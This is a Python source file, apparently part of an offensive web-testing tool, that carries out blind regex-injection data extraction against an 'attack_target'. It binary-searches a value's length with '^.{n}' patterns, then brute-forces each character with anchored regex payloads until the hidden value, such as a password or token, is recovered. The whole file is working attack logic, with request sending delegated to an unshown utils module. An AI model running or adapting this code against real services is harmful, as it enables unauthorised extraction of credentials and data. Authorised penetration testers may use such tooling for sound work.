from utils import *
import string

def regex_extract_get_length(attack_target, extraction_point):    
    marker_in_json = (isinstance(extraction_point, dict) and find_keys_of_dict_values(extraction_point, "§regex_brute§"))
    marker_in_str = (isinstance(extraction_point, str) and "§regex_brute§" in extraction_point)
    
    if  marker_in_str or marker_in_json:
        length_results=[]
        print(f"Enumerating valid values length for: {extraction_point}")    
              
        found_max_length = find_max_length_regex(attack_target, extraction_point, 1, 1000)        
        for i in range(1,found_max_length):
            extraction_payload = "^.{"+str(i)+"}$"    
            if send_extraction_request(attack_target, extraction_point, extraction_payload):
                length_results.append(i)
            if found_max_length>10:
                progress_bar(i, found_max_length-1)
        
        length_results.append(found_max_length)        
        return length_results    

def find_max_length_regex(attack_target, extraction_point, low, high):
    while low <= high:
        mid = (low + high) // 2
        if send_extraction_request(attack_target, extraction_point, f"^.{{{mid}}}"):
            low = mid + 1
        else:
            high = mid - 1
    return high

def regex_extract_brute_valid_values(attack_target, extraction_point, length_list):
    print(f"Brute forcing valid input values: ...")    
    res_list= []
    for length in length_list:
        result= ""        
        for i in range(1,length+1):            
            new_found = False
            # try all printable chars            
            for c in string.digits+string.ascii_letters+"".join(list("!\"#$%&'()*+,-./:;<=>?@[]^_`{|}~")):
                # test result+char+.* with matching length 
                payload = result+escape_reserved_characters(c)
                extraction_payload = f"^{payload}.{{{length-len(payload)}}}$"
                # check if send payload was success
                if send_extraction_request(attack_target, extraction_point, extraction_payload):            
                    # valid char found
                    result += c                                             
                    progress_bar(len(result), length)
                    new_found =True
                    break

            if not new_found:
                print(f"No new char could be found (max length: {length})")                                 
                break
                
        print(f"Found accepted value: {result}")
        res_list.append([length, result])    
    return res_list

def escape_reserved_characters(input_string):    
    # List of reserved characters and their escaped versions
    reserved_characters = {
        '.': r'\.',
        '^': r'\^',
        '$': r'\$',
        '*': r'\*',
        '+': r'\+',
        '?': r'\?',
        '[':r'\[', 
        ']':r'\]', 
        '(': r'\(',
        ')': r'\)',
        '|': r'\|',        
    }

    # Escape all reserved characters in the input string
    for char, escaped_char in reserved_characters.items():
        input_string = input_string.replace(char, escaped_char)

    return input_string